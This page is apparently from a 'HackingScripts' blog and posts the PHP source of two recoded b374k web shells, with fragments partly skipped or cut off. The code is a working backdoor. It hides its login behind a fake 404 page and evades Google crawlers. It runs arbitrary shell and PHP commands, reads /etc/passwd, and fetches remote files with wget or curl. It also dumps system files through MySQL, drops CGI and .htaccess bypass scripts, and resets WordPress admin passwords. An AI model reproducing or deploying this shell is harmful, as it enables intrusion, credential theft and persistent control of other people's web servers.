HackingScripts

Hack Scripts for everybody

Web Shell b374k

10 Feb 2014

Many thanks to x’1n73ct for recoding this b374k Web Shell.

 1 <?php
 2 
 3 /* (Web Shell b374k r3c0d3d by x'1n73ct|default pass:"1n73ction") */
 4 $auth_pass = "9c80a1eaca699e2fc6b994721f8703bc";
 5 $color = "#00ff00";
 6 $default_action = 'FilesMan';
 7 @define('SELF_PATH', __FILE__);
 8 if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 9 header('HTTP/1.0 404 Not Found');
10 exit;
11 }
12 @session_start();
13 @error_reporting(0);
14 @ini_set('error_log',NULL);
15 @ini_set('log_errors',0);
16 @ini_set('max_execution_time',0);
17 @ini_set('output_buffering',0);

19 @set_time_limit(0);
20 @set_magic_quotes_runtime(0);
21 @define('VERSION', '2.1');
22 if( get_magic_quotes_gpc() ) {
23 function stripslashes_array($array) {
24 return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
25 }
26 $_POST = stripslashes_array($_POST);
27 }
28 function printLogin() {
29 ?>
30 &lt;h1&gt;Not Found&lt;/h1&gt;
31 &lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
32 &lt;hr&gt;
33 &lt;address&gt;Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80&lt;/address&gt;

35 input { margin:0;background-color:#fff;border:1px solid #fff; }
36 &lt;/style&gt;

..and another b374k shell recoded by BlackShadow:

  13     $_SESSION['login'] = "$nikmatin";
  14 }

 141 function rapih($text) {
 142     return trim(str_replace("&lt;br /&gt;", "", $text));
 143 }
 144 function magicboom($text) {
 145     if (!get_magic_quotes_gpc()) {
 146         return $text;
 147     }
 148     return stripslashes($text);
 149 }
 150 function showdir($pwd, $prompt) {
 151     $fname = array();
 152     $dname = array();
 153     if (function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
 154     else $posix = FALSE;
 155     $user = "????:????";
 156     if ($dh = opendir($pwd)) {
 157         while ($file = readdir($dh)) {
 158             if (is_dir($file)) {
 159                 $dname[] = $file;
 160             } elseif (is_file($file)) {
 161                 $fname[] = $file;
 162             }
 163         }
 164         closedir($dh);
 165     }
 166     sort($fname);
 167     sort($dname);
 168     $path = @explode(DIRECTORY_SEPARATOR, $pwd);
 169     $tree = @sizeof($path);
 170     $parent = "";
 171     $buff = " &lt;form action=\"?y=" . $pwd . "&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"&gt; &lt;table class=\"cmdbox\" style=\"width:50%;\"&gt; &lt;tr&gt;&lt;td&gt;$prompt&lt;/td&gt;&lt;td&gt;&lt;input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/form&gt; &lt;form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;tr&gt;&lt;td&gt;view file/folder&lt;/td&gt;&lt;td&gt;&lt;input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"" . $pwd . "\" /&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/form&gt;&lt;/table&gt;&lt;table class=\"explore\"&gt; &lt;tr&gt;&lt;th&gt;name&lt;/th&gt;&lt;th style=\"width:80px;\"&gt;size&lt;/th&gt;&lt;th style=\"width:210px;\"&gt;owner:group&lt;/th&gt;&lt;th style=\"width:80px;\"&gt;perms&lt;/th&gt;&lt;th style=\"width:110px;\"&gt;modified&lt;/th&gt;&lt;th style=\"width:190px;\"&gt;actions&lt;/th&gt;&lt;/tr&gt; ";
 172     if ($tree &gt; 2) for ($i = 0;$i &lt; $tree - 2;$i++) $parent.= $path[$i] . DIRECTORY_SEPARATOR;
 173     else $parent = $pwd;
 174     foreach ($dname as $folder) {
 175         if ($folder == ".") {
 176             if (!$win && $posix) {
 177                 $name = @posix_getpwuid(@fileowner($folder));
 178                 $group = @posix_getgrgid(@filegroup($folder));
 179                 $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
 180             } else {
 181                 $owner = $user;
 182             }
 183             $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "\"&gt;$folder&lt;/a&gt;&lt;/td&gt;&lt;td&gt;LINK&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($pwd) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($pwd)) . "&lt;/td&gt;&lt;td&gt;&lt;span id=\"titik1\"&gt;&lt;a href=\"?y=$pwd&amp;edit=" . $pwd . "newfile.php\"&gt;newfile&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik1','titik1_form');\"&gt;newfolder&lt;/a&gt;&lt;/span&gt; &lt;form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /&gt; &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt; ";
 184         } elseif ($folder == "..") {
 185             if (!$win && $posix) {
 186                 $name = @posix_getpwuid(@fileowner($folder));
 187                 $group = @posix_getgrgid(@filegroup($folder));
 188                 $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
 189             } else {
 190                 $owner = $user;
 191             }
 192             $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $parent . "\"&gt;$folder&lt;/a&gt;&lt;/td&gt;&lt;td&gt;LINK&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($parent) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($parent)) . "&lt;/td&gt;&lt;td&gt;&lt;span id=\"titik2\"&gt;&lt;a href=\"?y=$pwd&amp;edit=" . $parent . "newfile.php\"&gt;newfile&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik2','titik2_form');\"&gt;newfolder&lt;/a&gt;&lt;/span&gt; &lt;form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;/tr&gt;";
 193         } else {
 194             if (!$win && $posix) {
 195                 $name = @posix_getpwuid(@fileowner($folder));
 196                 $group = @posix_getgrgid(@filegroup($folder));
 197                 $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
 198             } else {
 199                 $owner = $user;
 200             }
 201             $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a id=\"" . clearspace($folder) . "_link\" href=\"?y=" . $pwd . $folder . DIRECTORY_SEPARATOR . "\"&gt;[ $folder ]&lt;/a&gt; &lt;form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $folder . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $folder . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($folder) . "_form','" . clearspace($folder) . "_link');\" /&gt; &lt;/form&gt; &lt;td&gt;DIR&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($pwd . $folder) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($folder)) . "&lt;/td&gt;&lt;td&gt;&lt;a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;fdelete=" . $pwd . $folder . "\"&gt;delete&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
 202         }
 203     }
 204     foreach ($fname as $file) {
 205         $full = $pwd . $file;
 206         if (!$win && $posix) {
 207             $name = @posix_getpwuid(@fileowner($file));
 208             $group = @posix_getgrgid(@filegroup($file));
 209             $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
 210         } else {
 211             $owner = $user;
 212         }
 213         $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a id=\"" . clearspace($file) . "_link\" href=\"?y=$pwd&amp;view=$full\"&gt;$file&lt;/a&gt; &lt;form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $file . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $file . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;td&gt;" . ukuran($full) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($full) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($full)) . "&lt;/td&gt; &lt;td&gt;&lt;a href=\"?y=$pwd&amp;edit=$full\"&gt;edit&lt;/a&gt; | &lt;a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;delete=$full\"&gt;delete&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;dl=$full\"&gt;download&lt;/a&gt;&nbsp;(&lt;a href=\"?y=$pwd&amp;dlgzip=$full\"&gt;gzip&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt;";
 214     }
 215     $buff.= "&lt;/table&gt;";
 216     return $buff;
 217 }
 218 function ukuran($file) {
 219     if ($size = @filesize($file)) {
 220         if ($size &lt;= 1024) return $size;
 221         else {
 222             if ($size &lt;= 1024 * 1024) {
 223                 $size = @round($size / 1024, 2);;
 224                 return "$size kb";
 225             } else {
 226                 $size = @round($size / 1024 / 1024, 2);
 227                 return "$size mb";
 228             }
 229         }
 230     } else return "???";
 231 }
 232 function exe($cmd) {
 233     if (function_exists('system')) {
 234         @ob_start();
 235         @system($cmd);
 236         $buff = @ob_get_contents();
 237         @ob_end_clean();
 238         return $buff;
 239     } elseif (function_exists('exec')) {
 240         @exec($cmd, $results);
 241         $buff = "";
 242         foreach ($results as $result) {
 243             $buff.= $result;
 244         }
 245         return $buff;
 246     } elseif (function_exists('passthru')) {
 247         @ob_start();
 248         @passthru($cmd);
 249         $buff = @ob_get_contents();
 250         @ob_end_clean();
 251         return $buff;
 252     } elseif (function_exists('shell_exec')) {
 253         $buff = @shell_exec($cmd);
 254         return $buff;
 255     }
 256 }
 257 function tulis($file, $text) {
 258     $textz = gzinflate(base64_decode($text));
 259     if ($filez = @fopen($file, "w")) {
 260         @fputs($filez, $textz);
 261         @fclose($file);
 262     }
 263 }
 264 function ambil($link, $file) {
 265     if ($fp = @fopen($link, "r")) {
 266         while (!feof($fp)) {
 267             $cont.= @fread($fp, 1024);
 268         }
 269         @fclose($fp);
 270         $fp2 = @fopen($file, "w");
 271         @fwrite($fp2, $cont);
 272         @fclose($fp2);
 273     }
 274 }
 275 function which($pr) {
 276     $path = exe("which $pr");
 277     if (!empty($path)) {
 278         return trim($path);
 279     } else {
 280         return trim($pr);
 281     }
 282 }
 283 function download($cmd, $url) {
 284     $namafile = basename($url);
 285     switch ($cmd) {
 286         case 'wwget':
 287             exe(which('wget') . " " . $url . " -O " . $namafile);
 288         break;
 289         case 'wlynx':
 290             exe(which('lynx') . " -source " . $url . " &gt; " . $namafile);
 291         break;
 292         case 'wfread':
 293             ambil($wurl, $namafile);
 294         break;
 295         case 'wfetch':
 296             exe(which('fetch') . " -o " . $namafile . " -p " . $url);
 297         break;
 298         case 'wlinks':
 299             exe(which('links') . " -source " . $url . " &gt; " . $namafile);
 300         break;
 301         case 'wget':
 302             exe(which('GET') . " " . $url . " &gt; " . $namafile);
 303         break;
 304         case 'wcurl':
 305             exe(which('curl') . " " . $url . " -o " . $namafile);
 306         break;
 307         default:
 308         break;
 309     }
 310     return $namafile;
 311 }
 312 function get_perms($file) {
 313     if ($mode = @fileperms($file)) {
 314         $perms = '';
 315         $perms.= ($mode & 00400) ? 'r' : '-';
 316         $perms.= ($mode & 00200) ? 'w' : '-';
 317         $perms.= ($mode & 00100) ? 'x' : '-';
 318         $perms.= ($mode & 00040) ? 'r' : '-';
 319         $perms.= ($mode & 00020) ? 'w' : '-';
 320         $perms.= ($mode & 00010) ? 'x' : '-';
 321         $perms.= ($mode & 00004) ? 'r' : '-';
 322         $perms.= ($mode & 00002) ? 'w' : '-';
 323         $perms.= ($mode & 00001) ? 'x' : '-';
 324         return $perms;
 325     } else return "??????????";
 326 }
 327 function clearspace($text) {
 328     return str_replace(" ", "_", $text);
 329 }

 419  <?php if (isset($_GET['x']) && ($_GET['x'] == 'php')) { ?> &lt;form action="?y=<?php echo $pwd; ?>&x=php" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td&gt; &lt;textarea class="output" name="cmd" id="cmd"&gt; <?php if (isset($_POST['submitcmd'])) {
 420         echo eval(magicboom($_POST['cmd']));
 421     } else echo "echo file_get_contents('/etc/passwd');"; ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td&gt;&lt;input style="width:6%;margin:0px;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/form&gt; <?php
 422 } elseif (isset($_GET['x']) && ($_GET['x'] == 'mysql')) {
 423     if (isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])) {
 424         $sqlhost = $_GET['sqlhost'];
 425         $sqluser = $_GET['sqluser'];
 426         $sqlpass = $_GET['sqlpass'];
 427         $sqlport = $_GET['sqlport'];
 428         if ($con = @mysql_connect($sqlhost . ":" . $sqlport, $sqluser, $sqlpass)) {
 429             $msg.= "&lt;div style=\"width:99%;padding:4px 10px 0 10px;\"&gt;";
 430             $msg.= "&lt;p&gt;Connected to " . $sqluser . "&lt;span class=\"gaya\"&gt;@&lt;/span&gt;" . $sqlhost . ":" . $sqlport;
 431             $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;\"&gt;[ databases ]&lt;/a&gt;";
 432             if (isset($_GET['db'])) $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost .  433             if (isset($_GET['table'])) $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "&amp;table=" . $_GET['table'] . "\"&gt;" . htmlspecialchars($_GET['table']) . "&lt;/a&gt;";
 434             $msg.= "&lt;/p&gt;&lt;p&gt;version : " . mysql_get_server_info($con) . " proto " . mysql_get_proto_info($con) . "&lt;/p&gt;";
 435             $msg.= "&lt;/div&gt;";
 436             echo $msg;
 437             if (isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))) {
 438                 $db = $_GET['db'];
 439                 $query = "DROP TABLE IF EXISTS b374k_table;
 440 CREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );
 441 LOAD DATA INFILE \"/etc/passwd\"
 442 INTO TABLE b374k_table;SELECT * FROM b374k_table;
 443 DROP TABLE IF EXISTS b374k_table;";
 444                 $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;$query&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
 445                 $tables = array();
 446                 $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;&lt;th&gt;available tables on " . $db . "&lt;/th&gt;&lt;/tr&gt;";
 447                 $hasil = @mysql_list_tables($db, $con);
 448                 while (list($table) = @mysql_fetch_row($hasil)) {
 449                     @array_push($tables, $table);
 450                 }
 451                 @sort($tables);
 452                 foreach ($tables as $table) {
 453                     $msg.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "&amp;table=" . $table . "\"&gt;$table&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
 454                 }
 455                 $msg.= "&lt;/table&gt;";
 456             } elseif (isset($_GET['table']) && (!isset($_GET['sqlquery']))) {
 457                 $db = $_GET['db'];
 458                 $table = $_GET['table'];
 459                 $query = "SELECT * FROM " . $db . "." . $table . " LIMIT 0,100;";
 460                 $msgq = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
 461                 $columns = array();
 462                 $msg = "&lt;table class=\"explore\" style=\"width:99%;\"&gt;";
 463                 $hasil = @mysql_query("SHOW FIELDS FROM " . $db . "." . $table);
 464                 while (list($column) = @mysql_fetch_row($hasil)) {
 465                     $msg.= "&lt;th&gt;$column&lt;/th&gt;";
 466                     $kolum = $column;
 467                 }
 468                 $msg.= "&lt;/tr&gt;";
 469                 $hasil = @mysql_query("SELECT count(*) FROM " . $db . "." . $table);
 470                 list($total) = mysql_fetch_row($hasil);
 471                 if (isset($_GET['z'])) $page = (int)$_GET['z'];
 472                 else $page = 1;
 473                 $pagenum = 100;
 474                 $totpage = ceil($total / $pagenum);
 475                 $start = (($page - 1) * $pagenum);
 476                 $hasil = @mysql_query("SELECT * FROM " . $db . "." . $table . " LIMIT " . $start . "," . $pagenum);
 477                 while ($datas = @mysql_fetch_assoc($hasil)) {
 478                     $msg.= "&lt;tr&gt;";
 479                     foreach ($datas as $data) {
 480                         if (trim($data) == "") $data = "&nbsp;";
 481                         $msg.= "&lt;td&gt;$data&lt;/td&gt;";
 482                     }
 483                     $msg.= "&lt;/tr&gt;";
 484                 }
 485                 $msg.= "&lt;/table&gt;";
 486                 $head = "&lt;div style=\"padding:10px 0 0 6px;\"&gt; &lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /&gt; Page &lt;select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\"&gt;";
 487                 for ($i = 1;$i &lt;= $totpage;$i++) {
 488                     $head.= "&lt;option value=\"" . $i . "\"&gt;" . $i . "&lt;/option&gt;";
 489                     if ($i == $_GET['z']) $head.= "&lt;option value=\"" . $i . "\" selected=\"selected\"&gt;" . $i . "&lt;/option&gt;";
 490                 }
 491                 $head.= "&lt;/select&gt;&lt;noscript&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /&gt;&lt;/noscript&gt;&lt;/form&gt;&lt;/div&gt;";
 492                 $msg = $msgq . $head . $msg;
 493             } elseif (isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")) {
 494                 $db = $_GET['db'];
 495                 $query = magicboom($_GET['sqlquery']);
 496                 $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd .  498                 $querys = explode(";", $query);
 499                 foreach ($querys as $query) {
 500                     if (trim($query) != "") {
 501                         $hasil = mysql_query($query);
 502                         if ($hasil) {
 503                             $msg.= "&lt;p style=\"padding:0;margin:20px 6px 0 6px;\"&gt;" . $query . ";&nbsp;&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;[&lt;/span&gt; ok &lt;span class=\"gaya\"&gt;]&lt;/span&gt;&lt;/p&gt;";
 504                             $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;";
 505                             for ($i = 0;$i &lt; @mysql_num_fields($hasil);$i++) $msg.= "&lt;th&gt;" . htmlspecialchars(@mysql_field_name($hasil, $i)) . "&lt;/th&gt;";
 506                             $msg.= "&lt;/tr&gt;";
 507                             for ($i = 0;$i &lt; @mysql_num_rows($hasil);$i++) {
 508                                 $rows = @mysql_fetch_array($hasil);
 509                                 $msg.= "&lt;tr&gt;";
 510                                 for ($j = 0;$j &lt; @mysql_num_fields($hasil);$j++) {
 511                                     if ($rows[$j] == "") $dataz = "&nbsp;";
 512                                     else $dataz = $rows[$j];
 513                                     $msg.= "&lt;td&gt;" . $dataz . "&lt;/td&gt;";
 514                                 }
 515                                 $msg.= "&lt;/tr&gt;";
 516                             }
 517                             $msg.= "&lt;/table&gt;";
 518                         } else $msg.= "&lt;p style=\"padding:0;margin:20px 6px 0 6px;\"&gt;" . $query . ";&nbsp;&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;[&lt;/span&gt; error &lt;span class=\"gaya\"&gt;]&lt;/span&gt;&lt;/p&gt;";

 520                 }
 521             } else {
 522                 $query = "SHOW PROCESSLIST;

 525                 $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd .  537             }

 539         } else $msg = "&lt;p style=\"text-align:center;\"&gt;cant connect to mysql server&lt;/p&gt;";

 543 } elseif (isset($_GET['x']) && ($_GET['x'] == 'phpinfo')) {

 671     $write = fwrite($file, base64_decode($cgi2012));
 672     fclose($file);
 673     chmod("cgi2012.izo", 0755);
 674     echo " &lt;iframe src=cgi2012/cgi2012.izo width=96% height=76% frameborder=0&gt;&lt;/iframe&gt;
 675 
 676  &lt;/div&gt;";
 677 } elseif (isset($_GET['x']) && ($_GET['x'] == 'python')) {

 679  +--==[ python  Bypass Exploit ]==--+
 680  &lt;/b&gt;&lt;br&gt;&lt;br&gt;";
 681     mkdir('python', 0755);
 682     chdir('python');
 683     $kokdosya = ".htaccess";
 684     $dosya_adi = "$kokdosya";
 685     $dosya = fopen($dosya_adi, 'w') or die("Dosya a&#231;&#305;lamad&#305;!");

 883         @mysql_select_db($database) or die(mysql_error());
 884         $hash = crypt($pwd);
 885         $a4s = @mysql_query("UPDATE wp_users SET user_login ='" . $admin . "' WHERE ID = 1") or die(mysql_error());
 886         $a4s = @mysql_query("UPDATE wp_users SET user_pass ='" . $hash . "' WHERE ID = 1") or die(mysql_error());
 887         $a4s = @mysql_query("UPDATE wp_users SET user_login ='" . $admin . "' WHERE ID = 2") or die(mysql_error());

 944 } elseif (isset($_GET['view']) && ($_GET['view'] != "")) {
 945     if (is_file($_GET['view'])) {
 946         if (!isset($file)) $file = magicboom($_GET['view']);
 947         if (!$win && $posix) {
 948             $name = @posix_getpwuid(@fileowner($file));
 949             $group = @posix_getgrgid(@filegroup($file));
 950             $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
 951         } else {
 952             $owner = $user;
 953         }
 954         $filn = basename($file);
 955         echo "&lt;table style=\"margin:6px 0 0 2px;line-height:20px;\"&gt; &lt;tr&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td&gt;&lt;span id=\"" . clearspace($filn) . "_link\"&gt;" . $file . "&lt;/span&gt; &lt;form action=\"?y=" . $pwd . "&amp;view=$file\" method=\"post\" id=\"" . clearspace($filn) . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $filn . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Size&lt;/td&gt;&lt;td&gt;" . ukuran($file) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Permission&lt;/td&gt;&lt;td&gt;" . get_perms($file) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Owner&lt;/td&gt;&lt;td&gt;" . $owner . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Create time&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @filectime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Last modified&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @filemtime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Last accessed&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @fileatime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Actions&lt;/td&gt;&lt;td&gt;&lt;a href=\"?y=$pwd&amp;edit=$file\"&gt;edit&lt;/a&gt; | &lt;a href=\"javascript:tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;delete=$file\"&gt;delete&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;dl=$file\"&gt;download&lt;/a&gt;&nbsp;(&lt;a 